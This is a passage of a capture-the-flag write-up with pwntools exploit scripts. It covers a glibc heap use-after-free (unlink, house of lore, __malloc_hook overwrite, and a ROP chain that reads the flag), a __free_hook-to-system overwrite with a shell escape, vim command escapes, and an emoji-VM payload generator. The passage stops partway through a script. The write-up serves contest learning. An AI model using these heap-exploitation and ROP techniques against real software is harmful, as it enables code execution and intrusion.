<p>The vulnerability is a simple UAF, the relevant leakage is very easy, but we can only use <code>calloc</code> in normal allocation which does not use <code>tcache</code>, and <code>fastbin</code> and <code>unsorted bin</code> aren&#39;t allowed due to size limit. The hidden function allows to <code>malloc(0x217)</code>, but only when <code>0x220</code> <code>tcache</code> count is larger than 6, so we cannot write <code>fd</code> to achieve arbitrary write.</p>
<p>Initially we tried <code>unsorted bin attack</code>, but it seems that we must use chunk that will not be putted into <code>tcache</code> to do unsorted bin attack. Then I tried <code>house of lore</code> to allocate a chunk at <code>tcache arena</code>, however the program crashes at <code>memset</code> function since the size passed into <code>memset</code> function is too large. The root cause is that <code>calloc</code> uses the <code>chunk_size-0x10</code> as the argument of <code>memset</code>, and <code>chunk_size</code> can only be <code>0</code> or a heap address, which always gives a size that is way too large.</p>
<p>The solution is to use <code>unlink</code> first to rewrite <code>0x220 tcache pointer</code> to <code>&amp;pointer - 0x18</code>, so that we can allocate a chunk at <code>tcache arena</code> to fake a <code>0x10</code> chunk size there first, then use <code>house of lore</code> attack again, and this time size passed into <code>memset</code> is <code>0x10-0x10=0</code> which does not cause any crash.</p>
<p>Then it is easy to rewrite the <code>0x220 tcache pointer</code> while still keeping <code>tcache count</code> being 7, by allocating <code>malloc(0x217)</code> we can achieve arbitrary memory write. We can write <code>__malloc_hook</code> and perform ROP since stack contents are controllable.</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

AES_BLOCK_SIZE = <span class="hljs-number">16</span>
g_local=<span class="hljs-number">0</span>
context(log_level=<span class="hljs-string">'debug'</span>, arch=<span class="hljs-string">'amd64'</span>)
e = ELF(<span class="hljs-string">"./libc.so.6"</span>)
<span class="hljs-keyword">if</span> g_local:
    sh = process(<span class="hljs-string">"./one_punch"</span>, env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
    gdb.attach(sh)
<span class="hljs-keyword">else</span>:
    sh = remote(<span class="hljs-string">"52.198.120.1"</span>, <span class="hljs-number">48763</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ce</span><span class="hljs-params">(cmd, idx, name)</span>:</span>
    sh.send(cmd + <span class="hljs-string">'\x00'</span>)
    sh.sendafter(<span class="hljs-string">"idx: "</span>, str(idx) + <span class="hljs-string">'\x00'</span>)
    sh.sendafter(<span class="hljs-string">"name: "</span>, name)
    sh.recvuntil(<span class="hljs-string">"&gt; "</span>)

create = <span class="hljs-keyword">lambda</span> idx,name: ce(<span class="hljs-string">'1'</span>, idx, name)
edit = <span class="hljs-keyword">lambda</span> idx,name: ce(<span class="hljs-string">'2'</span>, idx, name)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sh.send(<span class="hljs-string">'3\x00'</span>)
    sh.sendafter(<span class="hljs-string">"idx: "</span>, str(idx) + <span class="hljs-string">'\x00'</span>)
    sh.recvuntil(<span class="hljs-string">"name: "</span>)
    ret = sh.recvuntil(<span class="hljs-string">"\n####"</span>)[:<span class="hljs-number">-5</span>]
    sh.recvuntil(<span class="hljs-string">"&gt; "</span>)
    <span class="hljs-keyword">return</span> ret

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
    sh.send(<span class="hljs-string">'4\x00'</span>)
    sh.sendafter(<span class="hljs-string">"idx: "</span>, str(idx) + <span class="hljs-string">'\x00'</span>)
    <span class="hljs-keyword">return</span> sh.recvuntil(<span class="hljs-string">"&gt; "</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">punch</span><span class="hljs-params">(data=<span class="hljs-string">"a"</span>)</span>:</span>
    sh.send(<span class="hljs-string">"50056"</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
    sh.send(data)
    sh.recvuntil(<span class="hljs-string">"&gt; "</span>)

create(<span class="hljs-number">0</span>, <span class="hljs-string">'0'</span> * <span class="hljs-number">0x217</span>)
create(<span class="hljs-number">1</span>, <span class="hljs-string">'1'</span> * <span class="hljs-number">0x217</span>)

delete(<span class="hljs-number">0</span>)
delete(<span class="hljs-number">1</span>)

heap_addr = u64(show(<span class="hljs-number">1</span>) + <span class="hljs-string">'\x00\x00'</span>) - <span class="hljs-number">0x260</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">5</span>):
    create(<span class="hljs-number">0</span>, <span class="hljs-string">'2'</span> * <span class="hljs-number">0x217</span>)
    delete(<span class="hljs-number">0</span>)

create(<span class="hljs-number">0</span>, <span class="hljs-string">'2'</span> * <span class="hljs-number">0x217</span>)
create(<span class="hljs-number">1</span>, <span class="hljs-string">'3'</span> * <span class="hljs-number">0x217</span>)
delete(<span class="hljs-number">0</span>)

libc_addr = u64(show(<span class="hljs-number">0</span>)+<span class="hljs-string">'\x00\x00'</span>) - <span class="hljs-number">0x1e4ca0</span>
<span class="hljs-keyword">print</span> hex(heap_addr),hex(libc_addr)
delete(<span class="hljs-number">1</span>)

punch() <span class="hljs-comment"># consume 1 tcache</span>
create(<span class="hljs-number">0</span>, <span class="hljs-string">'T'</span> * <span class="hljs-number">0x217</span>)
delete(<span class="hljs-number">0</span>)
edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)
delete(<span class="hljs-number">0</span>)
<span class="hljs-comment"># now top chunk + 0x10 == top elem in 0x220</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
    create(i, <span class="hljs-string">'U'</span> * <span class="hljs-number">0x217</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
    delete(i) <span class="hljs-comment"># all merged to top</span>

fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>)
fake_chunk += p64(heap_addr + <span class="hljs-number">0x150</span> - <span class="hljs-number">0x18</span>)
fake_chunk += p64(heap_addr + <span class="hljs-number">0x150</span> - <span class="hljs-number">0x10</span>)
fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">'F'</span>)
fake_chunk += p64(<span class="hljs-number">0x210</span>) + p64(<span class="hljs-number">0x600</span>)

create(<span class="hljs-number">0</span>, cyclic(<span class="hljs-number">0x400</span>))
edit(<span class="hljs-number">0</span>, fake_chunk)
<span class="hljs-comment"># 0x220 &lt;- 0x200 top</span>
<span class="hljs-comment"># +0x1e0 &lt;- g[2].ptr</span>
create(<span class="hljs-number">2</span>, cyclic(<span class="hljs-number">0x400</span>))

<span class="hljs-comment"># current heap layout:</span>
<span class="hljs-comment"># 0x400 chunk</span>
<span class="hljs-comment"># [fake 0x210 chunk + 0x600 chunk head, whose next is top]</span>
<span class="hljs-comment"># 0x400 chunk</span>

delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># unlink trigger, things merged to top</span>

punch(p64(<span class="hljs-number">0x28</span>))
<span class="hljs-comment"># fake chunk_size for smallbin attack</span>
<span class="hljs-comment"># otherwise calloc will crash in memset</span>

create(<span class="hljs-number">0</span>, <span class="hljs-string">'7'</span> * <span class="hljs-number">0x217</span>)
delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># fill 0x220 tcache</span>

<span class="hljs-comment"># consolidate topchunk</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">6</span>):
    create(<span class="hljs-number">0</span>, <span class="hljs-string">'4'</span> * <span class="hljs-number">0x1f0</span>)
    delete(<span class="hljs-number">0</span>)

create(<span class="hljs-number">1</span>, <span class="hljs-string">'P'</span> * <span class="hljs-number">0x217</span>) <span class="hljs-comment"># create a padding</span>
create(<span class="hljs-number">0</span>, <span class="hljs-string">'4'</span> * <span class="hljs-number">0x1f0</span>) <span class="hljs-comment"># last tcache chunk</span>

delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># put it to tcache</span>
edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>))
<span class="hljs-comment"># rewrite fd and key to bypass double free check</span>

delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># to topchunk</span>
delete(<span class="hljs-number">1</span>) <span class="hljs-comment"># to topchunk</span>

<span class="hljs-comment"># now 0x200 -&gt; 7, top element is behind topchunk</span>
<span class="hljs-comment"># now 0x220 -&gt; 7</span>

create(<span class="hljs-number">0</span>, <span class="hljs-string">'5'</span> * <span class="hljs-number">0x220</span>)
create(<span class="hljs-number">0</span>, <span class="hljs-string">'4'</span> * <span class="hljs-number">0x1f0</span>) <span class="hljs-comment"># chunk_head == top at 0x200</span>
create(<span class="hljs-number">1</span>, <span class="hljs-string">'5'</span> * <span class="hljs-number">0x200</span>)

delete(<span class="hljs-number">0</span>)
create(<span class="hljs-number">1</span>, <span class="hljs-string">'5'</span> * <span class="hljs-number">0x200</span>) <span class="hljs-comment"># put to smallbin</span>

edit(<span class="hljs-number">0</span>, p64(libc_addr+<span class="hljs-number">0x1e4e90</span>) + p64(heap_addr+<span class="hljs-number">0x130</span>))
delete(<span class="hljs-number">1</span>)
edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(heap_addr+<span class="hljs-number">0x130</span>))

create(<span class="hljs-number">0</span>, <span class="hljs-string">'C'</span> * <span class="hljs-number">0x1f0</span>)
create(<span class="hljs-number">0</span>, <span class="hljs-string">'A'</span> * <span class="hljs-number">0x10</span> + p64(libc_addr + \
    e.symbols[<span class="hljs-string">"__malloc_hook"</span>]).ljust(<span class="hljs-number">0x1e0</span>, <span class="hljs-string">'\x00'</span>))

<span class="hljs-comment"># add rsp,48; ret</span>
punch(p64(libc_addr + <span class="hljs-number">0x8cfd6</span>) + <span class="hljs-string">"flag\x00"</span>)

pop_rdi = p64(libc_addr + <span class="hljs-number">0x26542</span>)
pop_rsi = p64(libc_addr + <span class="hljs-number">0x26f9e</span>)
pop_rdx = p64(libc_addr + <span class="hljs-number">0x12bda6</span>)
pop_rcx = p64(libc_addr + <span class="hljs-number">0x10b31e</span>)

rop = pop_rdi + p64(<span class="hljs-number">2</span>)
rop += pop_rsi
rop += p64(libc_addr + e.symbols[<span class="hljs-string">"__malloc_hook"</span>] + <span class="hljs-number">8</span>)
rop += pop_rdx + p64(<span class="hljs-number">0</span>)
rop += p64(libc_addr + e.symbols[<span class="hljs-string">"syscall"</span>])
rop += pop_rdi + p64(<span class="hljs-number">3</span>)
rop += pop_rsi + p64(heap_addr + <span class="hljs-number">0x2000</span>)
rop += pop_rdx + p64(<span class="hljs-number">0x100</span>)
rop += p64(libc_addr + e.symbols[<span class="hljs-string">"read"</span>])
rop += pop_rdi + p64(<span class="hljs-number">1</span>)
rop += pop_rsi + p64(heap_addr + <span class="hljs-number">0x2000</span>)
rop += pop_rdx + p64(<span class="hljs-number">0x100</span>)
rop += p64(libc_addr + e.symbols[<span class="hljs-string">"write"</span>])
rop += p64(<span class="hljs-number">0</span>)

create(<span class="hljs-number">0</span>, rop)

sh.interactive()</code></pre><h3 id="ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]"><a class="header-link" href="#ðŸŽƒ-trick-or-treat-ðŸŽƒ-[234pts]"></a>ðŸŽƒ Trick or Treat ðŸŽƒ [234pts]</h3>
<pre class="hljs"><code>from pwn <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    p = process(<span class="hljs-string">'./trick_or_treat'</span>, env={<span class="hljs-string">'LD_PRELOAD'</span>: <span class="hljs-string">'./trick.libc'</span>})
<span class="hljs-keyword">else</span>:
    p = remote(<span class="hljs-string">'3.112.41.140'</span>, <span class="hljs-number">56746</span>)
libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)

p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x1000000</span>))
p.recvuntil(<span class="hljs-string">':'</span>)
<span class="hljs-keyword">if</span> debug:
    gdb.attach(p, <span class="hljs-string">'b free '</span>)
magic = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">'\n'</span>), <span class="hljs-number">16</span>)
libc.address = magic + <span class="hljs-number">0x1001000</span> - <span class="hljs-number">0x10</span>
<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'libc:'</span> + <span class="hljs-built_in">hex</span>(libc.address))

p.sendlineafter(<span class="hljs-string">'e:'</span>,
                <span class="hljs-string">'{} {}'</span>.format(<span class="hljs-built_in">hex</span>((libc.symbols[<span class="hljs-string">'__free_hook'</span>] - magic) / <span class="hljs-number">8</span>)[<span class="hljs-number">2</span>:], <span class="hljs-built_in">hex</span>(libc.symbols[<span class="hljs-string">"system"</span>])[<span class="hljs-number">2</span>:]))
p.sendlineafter(<span class="hljs-string">'e:'</span>, <span class="hljs-string">'0'</span> * <span class="hljs-number">0x1000</span> + <span class="hljs-string">' '</span> + <span class="hljs-string">'ed'</span>)
#p.sendline(<span class="hljs-string">'ls'</span>)
p.interactive()</code></pre><pre class="hljs"><code>!/bin/cat /home/trick_or_treat/flag.txt</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
<h3 id="welcome-[50pts]"><a class="header-link" href="#welcome-[50pts]"></a>Welcome [50pts]</h3>
<p><code>:!cat flag</code></p>
<h3 id="revenge-of-welcome-[105pts]"><a class="header-link" href="#revenge-of-welcome-[105pts]"></a>Revenge of Welcome [105pts]</h3>
<p><code>Ctrl+o</code> -&gt; <code>:!cat flag</code></p>
<h3 id="emojiivm-[198pts]"><a class="header-link" href="#emojiivm-[198pts]"></a>EmojiiVM [198pts]</h3>
<pre class="hljs"><code>
NOP = <span class="hljs-number">1</span>
ADD = <span class="hljs-number">2</span>
SUB = <span class="hljs-number">3</span>
MUL = <span class="hljs-number">4</span>
MOD = <span class="hljs-number">5</span>
XOR = <span class="hljs-number">6</span>
AND = <span class="hljs-number">7</span>
LWR = <span class="hljs-number">8</span>
EQU = <span class="hljs-number">9</span>
JMP = <span class="hljs-number">10</span>
JT = <span class="hljs-number">11</span>
JF = <span class="hljs-number">12</span>
<span class="hljs-comment"># IMM = 13</span>
POP = <span class="hljs-number">14</span>
<span class="hljs-comment"># GET = 15</span>
<span class="hljs-comment"># SET = 16</span>
NEW = <span class="hljs-number">17</span>
DEL = <span class="hljs-number">18</span>
EDIT = <span class="hljs-number">19</span>
SHOW = <span class="hljs-number">20</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IMM</span><span class="hljs-params">(v)</span>:</span>
    <span class="hljs-keyword">assert</span> v &lt;= <span class="hljs-number">10</span>
    <span class="hljs-keyword">return</span> [<span class="hljs-number">13</span>, -v]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IMMX</span><span class="hljs-params">(v)</span>:</span>
    <span class="hljs-keyword">if</span> v &lt;= <span class="hljs-number">10</span>:
        <span class="hljs-keyword">return</span> IMM(v)
    <span class="hljs-keyword">else</span>:
        hi, lo = divmod(v, <span class="hljs-number">10</span>)
        pl = IMMX(hi) + IMM(<span class="hljs-number">10</span>) + [MUL]
        <span class="hljs-keyword">if</span> lo != <span class="hljs-number">0</span>:
            pl += IMM(lo) + [ADD]
    <span class="hljs-keyword">return</span> pl

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span><span class="hljs-params">(idx, off)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(off) + IMMX(idx) + [<span class="hljs-number">15</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SET</span><span class="hljs-params">(idx, off)</span>:</span>
    <span class="hljs-keyword">return</span> IMMX(off) + IMMX(idx) + [<span class="hljs-number">16</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">STR</span><span class="hljs-params">(idx, s)</span>:</span>
    pl = []
    <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(s):
        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [<span class="hljs-number">16</span>] <span class="hljs-comment"># set</span>
    <span class="hljs-keyword">return</span> pl

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GETI</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> GET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GETJ</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">return</span> GET(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LOC</span><span class="hljs-params">(i)</span>:</span>
    <span class="hljs-keyword">return</span> [i | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">30</span>)] * <span class="hljs-number">14</span> <span class="hljs-comment"># len(IMMX(999))</span>

pl = IMMX(<span class="hljs-number">20</span>) + [NEW] + IMMX(<span class="hljs-number">20</span>) + [NEW]
pl += STR(<span class="hljs-number">1</span>, <span class="hljs-string">'0 * 0 = 0\n'</span>)

pl += IMM(<span class="hljs-number">1</span>) + SET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># i = 1</span>
loc3 = len(pl)
pl += IMM(<span class="hljs-number">10</span>) + GETI() + [LWR] + LOC(<span class="hljs-number">1</span>) + [JF]

pl += IMM(<span class="hljs-number">1</span>) + SET(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) <span class="hljs-comment"># j = 1</span>
loc4 = len(pl)
pl += IMM(<span class="hljs-number">10</span>) + GETJ() + [LWR] + LOC(<span class="hljs-number">2</span>) + [JF]

pl += GETI() + IMMX(<span class="hljs-number">0x30</span>) + [ADD] + SET(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)
pl += GETJ() + IMMX(<span class="hljs-number">0x30</span>) + [ADD] + SET(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)
pl += GETI() + GETJ() + [MUL] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)

pl += LOC(<span class="hljs-number">5</span>) + IMM(<span class="hljs-number">10</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [LWR] + LOC(<span class="hljs-number">5</span>) + [JF]

pl += IMMX(<span class="hljs-number">10</span>) + SET(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>) + IMM(<span class="hljs-number">0</span>) + SET(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)
pl += GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + IMMX(<span class="hljs-number">0x30</span>) + [ADD] + SET(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)
pl += IMM(<span class="hljs-number">1</span>) + [SHOW]
pl += LOC(<span class="hljs-number">6</span>) + [JMP]

loc5 = len(pl)
pl += IMMX(<span class="hljs-number">10</span>) + SET(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>) + IMM(<span class="hljs-number">0</span>) + SET(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)
pl += IMM(<span class="hljs-number">10</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [MOD] + IMMX(<span class="hljs-number">0x30</span>) + [ADD] + SET(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>) <span class="hljs-comment"># lo</span>
pl += IMM(<span class="hljs-number">10</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [MOD] + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [SUB] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)
pl += IMM(<span class="hljs-number">0</span>) + SET(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>)

loc7 = len(pl)
pl += IMM(<span class="hljs-number">10</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [SUB] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)
pl += IMM(<span class="hljs-number">1</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>) + [ADD] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>)
pl += LOC(<span class="hljs-number">7</span>) + IMM(<span class="hljs-number">0</span>) + GET(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) + [EQU] + LOC(<span class="hljs-number">7</span>) + [JF]

pl += GET(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>) + IMMX(<span class="hljs-number">0x30</span>) + [ADD] + SET(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>) <span class="hljs-comment"># hi</span>
pl += IMM(<span class="hljs-number">1</span>) + [SHOW]

loc6 = len(pl)
pl += IMM(<span class="hljs-number">1</span>) + GETJ() + [ADD] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
pl += LOC(<span class="hljs-number">4</span>) + [JMP]

loc2 = len(pl)
pl += IMM(<span class="hljs-number">1</span>) + GETI() + [ADD] + SET(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
pl += LOC(<span class="hljs-number">3</span>) + [JMP]

loc1 = len(pl)
pl += [<span class="hljs-number">0x17</span>]

print(len(pl))
i = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> i &lt; len(pl):
    v = pl[i]
    <span class="hljs-keyword">if</span> v == LOC(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]:
        r = loc1
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]:
        r = loc2
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]:
        r = loc3
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]:
        r = loc4
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">5</span>)[<span class="hljs-number">0</span>]:
        r = loc5
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">6</span>)[<span class="hljs-number">0</span>]:
        r = loc6
    <span class="hljs-keyword">elif</span> v == LOC(<span class="hljs-number">7</span>)[<span class="hljs-number">0</span>]:
        r = loc7
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">assert</span> type(v) == int
        i += <span class="hljs-number">1</span>
        <span class="hljs-keyword">continue</span>
    a, t = divmod(r, <span class="hljs-number">100</span>)
    b, c = divmod(t, <span class="hljs-number">10</span>)
    t = IMM(a) + IMM(<span class="hljs-number">10</span>) + [MUL] + IMM(b) + [ADD] + IMM(<span class="hljs-number">10</span>) + [MUL] + IMM(c) + [ADD]
    <span class="hljs-keyword">assert</span> len(t) == <span class="hljs-number">14</span>
    pl = pl[:i] + t + pl[i + <span class="hljs-number">14</span>:]
    i += len(t)
print(pl)

consts = [<span class="hljs-number">128512</span>,<span class="hljs-number">128513</span>,<span class="hljs-number">128514</span>,<span class="hljs-number">129315</span>,<span class="hljs-number">128540</span>,<span class="hljs-number">128516</span>,<span class="hljs-number">128517</span>,<span class="hljs-number">128518</span>,<span class="hljs-number">128521</span>,<span class="hljs-number">128522</span>,<span class="hljs-number">128525</span>,]
opcodes = [<span class="hljs-number">0</span>,<span class="hljs-number">127539</span>,<span class="hljs-number">10133</span>,<span class="hljs-number">10134</span>,<span class="hljs-number">10060</span>,<span class="hljs-number">0x2753</span>,<span class="hljs-number">10062</span>,<span class="hljs-number">128107</span>,<span class="hljs-number">128128</span>,<span class="hljs-number">128175</span>,<span class="hljs-number">128640</span>,<span class="hljs-number">127542</span>,<span class="hljs-number">127514</span>,<span class="hljs-number">9196</span>,<span class="hljs-number">128285</span>,<span class="hljs-number">128228</span>,<span class="hljs-number">128229</span>,<span class="hljs-number">127381</span>,<span class="hljs-number">127379</span>,<span class="hljs-number">128196</span>,<span class="hljs-number">128221</span>,<span class="hljs-number">128289</span>,<span class="hljs-number">128290</span>,<span class="hljs-number">0x1F6D1</span>,]

mp = {
<span class="hljs-number">0x23EC</span>: <span class="hljs-string">'\xE2\x8F\xAC'</span>,
<span class="hljs-number">0x274c</span>: <span class="hljs-string">'\xE2\x9D\x8C'</span>,
<span class="hljs-number">0x274e</span>: <span class="hljs-string">'\xE2\x9D\x8E'</span>,
<span class="hljs-number">0x2753</span>: <span class="hljs-string">'\xE2\x9D\x93'</span>,
<span class="hljs-number">0x2795</span>: <span class="hljs-string">'\xE2\x9E\x95'</span>,
<span class="hljs-number">0x2796</span>: <span class="hljs-string">'\xE2\x9E\x96'</span>,
<span class="hljs-number">0x1F193</span>: <span class="hljs-string">'\xF0\x9F\x86\x93'</span>,
<span class="hljs-number">0x1F195</span>: <span class="hljs-string">'\xF0\x9F\x86\x95'</span>,
<span class="hljs-number">0x1F21A</span>: <span class="hljs-string">'\xF0\x9F\x88\x9A'</span>,
<span class="hljs-number">0x1F233</span>: <span class="hljs-string">'\xF0\x9F\x88\xB3'</span>,
<span class="hljs-number">0x1F236</span>: <span class="hljs-string">'\xF0\x9F\x88\xB6'</span>,
<span class="hljs-number">0x1f46b</span>: <span class="hljs-string">'\xF0\x9F\x91\xAB'</span>,
<span class="hljs-number">0x1f480</span>: <span class="hljs-string">'\xF0\x9F\x92\x80'</span>,
<span class="hljs-number">0x1f4af</span>: <span class="hljs-string">'\xF0\x9F\x92\xAF'</span>,
<span class="hljs-number">0x1f4c4</span>: <span class="hljs-string">'\xF0\x9F\x93\x84'</span>,
<span class="hljs-number">0x1f4dd</span>: <span class="hljs-string">'\xF0\x9F\x93\x9D'</span>,
<span class="hljs-number">0x1f4e4</span>: <span class="hljs-string">'\xF0\x9F\x93\xA4'</span>,
<span class="hljs-number">0x1f4e5</span>: <span class="hljs-string">'\xF0\x9F\x93\xA5'</span>,
<span class="hljs-number">0x1f51d</span>: <span class="hljs-string">'\xF0\x9F\x94\x9D'</span>,
<span class="hljs-number">0x1f521</span>: <span class="hljs-string">'\xF0\x9F\x94\xA1'</span>,
<span class="hljs-number">0x1f522</span>: <span class="hljs-string">'\xF0\x9F\x94\xA2'</span>,
<span class="hljs-number">0x1f600</span>: <span class="hljs-string">'\xF0\x9F\x98\x80'</span>,
<span class="hljs-number">0x1f601</span>: <span class="hljs-string">'\xF0\x9F\x98\x81'</span>,
<span class="hljs-number">0x1f602</span>: <span class="hljs-string">'\xF0\x9F\x98\x82'</span>,
<span class="hljs-number">0x1f604</span>: <span class="hljs-string">'\xF0\x9F\x98\x84'</span>,
<span class="hljs-number">0x1f605</span>: <span class="hljs-string">'\xF0\x9F\x98\x85'</span>,
<span class="hljs-number">0x1f606</span>: <span class="hljs-string">'\xF0\x9F\x98\x86'</span>,
<span class="hljs-number">0x1f609</span>: <span class="hljs-string">'\xF0\x9F\x98\x89'</span>,
<span class="hljs-number">0x1f60a</span>: <span class="hljs-string">'\xF0\x9F\x98\x8A'</span>,
<span class="hljs-number">0x1f60d</span>: <span class="hljs-string">'\xF0\x9F\x98\x8D'</span>,
<span class="hljs-number">0x1f61c</span>: <span class="hljs-string">'\xF0\x9F\x98\x9C'</span>,
<span class="hljs-number">0x1f680</span>: <span class="hljs-string">'\xF0\x9F\x9A\x80'</span>,
<span class="hljs-number">0x1f6d1</span>: <span class="hljs-string">'\xF0\x9F\x9B\x91'</span>,
<span class="hljs-number">0x1f923</span>: <span class="hljs-string">'\xF0\x9F\xA4\xA3'</span>,
}


out = []
i = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> i &lt; len(pl):
    v = pl[i]
    <span class="hljs-keyword">assert</span> type(v) == int
    <span class="hljs-keyword">if</span> v &lt;= <span class="hljs-number">0</span>:
        t = abs(v)
        <span class="hljs-keyword">assert</span> t &lt;= <span class="hljs-number">10</span>
        out.append(mp[consts[t]])
        i += <span class="hljs-number">1</span>
    <span class="hljs-keyword">elif</span> <span class="hljs-number">0</span> &lt; v <span class="hljs-keyword">and</span> v &lt; <span class="hljs-number">0x18</span>:
        out.append(mp[opcodes[v]])
        i += <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">raise</span> ValueError, v

open(<span class="hljs-string">'payload'</span>, <span class="hljs-string">'wb'</span>).write(<span class="hljs-string">''</span>.join(out))</code></pre><h3 id="hexdump-[202pts]"><a class="header-link" href="#hexdump-[202pts]"></a>heXDump [202pts]</h3>
<p>xxd overwrites partially.</p>
<pre class="hljs"><code><span class="hljs-comment">#! /usr/bin/env python2</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># vim:fenc=utf-8</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Copyright Â© 2018 anciety &lt;anciety@anciety-pc&gt;</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Distributed under terms of the MIT license.</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> os.path
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> string

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)
context.terminal = [<span class="hljs-string">'ancyterm'</span>, <span class="hljs-string">'-s'</span>, <span class="hljs-string">'192.168.142.1'</span>, <span class="hljs-string">'-t'</span>, <span class="hljs-string">'alacritty'</span>, <span class="hljs-string">'-e'</span>]

<span class="hljs-comment"># synonyms for faster typing</span>
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
